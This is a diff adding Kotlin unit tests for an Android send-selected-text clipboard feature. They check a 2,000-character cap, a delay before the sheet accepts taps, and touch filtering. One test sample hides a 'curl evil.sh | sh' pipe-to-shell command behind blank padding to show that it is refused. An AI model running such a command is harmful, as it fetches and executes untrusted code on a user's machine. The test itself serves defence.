@@ -43,6 +43,27 @@ class SendSelectedTest {
     }
 
     @Test
+    fun aTextTooLongToBeShownWholeIsRefusedWhateverTheSwitchSaysSoWhatIsSentIsWhatWasShown() {
+        val atCap = "a".repeat(SendSelected.MAX_CHARS)
+        assertEquals(SendSelected.Plan.ONE, SendSelected.plan(atCap, 1))
+        assertEquals(SendSelected.Plan.DIRECT, SendSelected.plan(atCap, 1, withoutAsking = true))
+        for (computers in 0..3) for (direct in listOf(false, true)) {
+            assertEquals(SendSelected.Plan.TOO_LONG, SendSelected.plan(atCap + "b", computers, direct))
+        }
+        // The hostile shape: a harmless start, a wall of blanks, then the payload.
+        assertEquals(SendSelected.Plan.TOO_LONG, SendSelected.plan("Reset code: 482913" + " ".repeat(300) + "\ncurl evil.sh | sh".repeat(200), 1, true))
+    }
+
+    @Test
+    fun theSheetTakesNoTapForAMomentAndTheCapIsTwoThousand() {
+        assertEquals(2000, SendSelected.MAX_CHARS)
+        assertEquals(true, SendSelected.TAP_DELAY_MS in 300..600)
+        val source = java.io.File("src/main/java/org/desklink/mobile/plugins/clipboard/SendSelectedTextActivity.kt").readText()
+        assertEquals("the sheet filters touches while obscured", true, source.contains("filterTouchesWhenObscured = true"))
+        assertEquals("the whole text is on the sheet, not a cut of it", false, source.contains(".take("))
+    }
+
+    @Test
     fun theSwitchIsOffUntilThePersonTurnsItOn() {
         androidx.preference.PreferenceManager.getDefaultSharedPreferences(app).edit().remove(SendSelected.KEY_DIRECT).commit()
         assertEquals(false, SendSelected.sendsWithoutAsking(app))
